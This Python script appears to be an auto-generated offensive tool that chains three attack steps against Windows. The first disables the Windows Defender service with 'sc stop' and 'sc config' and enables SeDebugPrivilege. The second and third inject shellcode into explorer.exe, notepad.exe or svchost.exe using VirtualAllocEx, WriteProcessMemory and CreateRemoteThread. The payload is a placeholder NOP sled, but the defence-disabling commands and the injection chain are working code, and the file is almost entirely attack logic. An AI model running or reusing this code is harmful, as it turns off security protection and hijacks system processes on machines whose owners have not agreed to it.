#!/usr/bin/env python3
import sys
import json
import time
import subprocess
import ctypes
import psutil
from ctypes import wintypes
from typing import Dict, Any

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Attempt to stop Windows Defender service
        subprocess.run(['sc', 'stop', 'WinDefend'], capture_output=True, timeout=10)
        subprocess.run(['sc', 'config', 'WinDefend', 'start=', 'disabled'], capture_output=True, timeout=10)

        # Attempt to acquire debug privileges
        has_debug = False
        try:
            # Get the current process token
            hToken = ctypes.windll.advapi32.OpenProcessToken(
                ctypes.windll.kernel32.GetCurrentProcess(),
                0x0020 | 0x0008  # TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
            )
            
            # Lookup the privilege value for SeDebugPrivilege
            privilege_id = ctypes.c_ulong()
            ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(privilege_id))
            
            # Enable the privilege
            class LUID_AND_ATTRIBUTES(ctypes.Structure):
                _fields_ = [("Luid", ctypes.c_ulong), ("Attributes", ctypes.c_ulong)]
            
            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [("PrivilegeCount", ctypes.c_ulong), ("Privileges", LUID_AND_ATTRIBUTES * 1)]
            
            new_privileges = TOKEN_PRIVILEGES()
            new_privileges.PrivilegeCount = 1
            new_privileges.Privileges[0].Luid = privilege_id.value
            new_privileges.Privileges[0].Attributes = 0x00000002  # SE_PRIVILEGE_ENABLED
            
            ctypes.windll.advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(new_privileges), 0, None, None)
            
            # Check if the privilege was successfully enabled
            has_debug = ctypes.windll.kernel32.GetLastError() == 0
        
        except Exception as e:
            # Log the error and continue
            pass

        result = {'has_debug': has_debug}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    PROCESS_ALL_ACCESS = 0x1F0FFF
    shellcode = b"\x90" * 100  # Example NOP sled shellcode
    result = {'remote_addr': None, 'success': False}
    injection_success = True

    try:
        # Step 1: Find target process
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
                target_pid = proc.info['pid']
                break

        if target_pid is None:
            # Fallback to self-injection
            target_pid = ctypes.windll.kernel32.GetCurrentProcess()
            injection_success = False

        # Step 2: Open process
        kernel32 = ctypes.windll.kernel32
        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not process_handle:
            raise Exception("Failed to open target process")

        # Step 3: Allocate memory in the target process
        remote_addr = kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x3000, 0x40)
        if not remote_addr:
            raise Exception("Failed to allocate memory in target process")

        # Step 4: Write shellcode to allocated memory
        written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(process_handle, remote_addr, shellcode, len(shellcode), ctypes.byref(written)):
            raise Exception("Failed to write shellcode to target process memory")

        # Step 5: Create a remote thread to execute the shellcode
        thread_id = ctypes.c_ulong(0)
        if not kernel32.CreateRemoteThread(process_handle, None, 0, remote_addr, None, 0, ctypes.byref(thread_id)):
            raise Exception("Failed to create remote thread in target process")

        result['remote_addr'] = remote_addr
        result['success'] = injection_success

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    PROCESS_ALL_ACCESS = 0x1F0FFF
    kernel32 = ctypes.windll.kernel32
    result = {'thread_id': None, 'running': False}
    
    try:
        # Step 1: Find target process
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
                target_pid = proc.info['pid']
                break
        
        injection_success = input_data.get('success', False)
        
        if target_pid is None:
            # Fallback to self-injection
            target_handle = kernel32.GetCurrentProcess()
            injection_success = False
        else:
            target_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        
        if not target_handle:
            raise Exception("Failed to open target process")

        # Step 2: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
        remote_addr = input_data.get('remote_addr', 0)
        shellcode = b"\x90" * 100  # NOP sled as placeholder shellcode
        
        # Allocate memory in the target process
        alloc_addr = kernel32.VirtualAllocEx(target_handle, 0, len(shellcode), 0x3000, 0x40)
        if not alloc_addr:
            raise Exception("VirtualAllocEx failed")
        
        # Write the shellcode into the allocated memory
        written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(target_handle, alloc_addr, shellcode, len(shellcode), ctypes.byref(written)):
            raise Exception("WriteProcessMemory failed")
        
        # Create a remote thread in the target process
        thread_id = ctypes.c_ulong(0)
        if not kernel32.CreateRemoteThread(target_handle, None, 0, alloc_addr, None, 0, ctypes.byref(thread_id)):
            raise Exception("CreateRemoteThread failed")
        
        result['thread_id'] = thread_id.value
        result['running'] = True

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Acquire Debug Privileges [privilege-escalation] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Acquire Debug Privileges): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Acquire Debug Privileges): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Inject Shellcode [execution] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Inject Shellcode): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Inject Shellcode): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Execute Injected Shellcode [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Execute Injected Shellcode): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Execute Injected Shellcode): FAILED — {err}')
            failed.append('T3')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))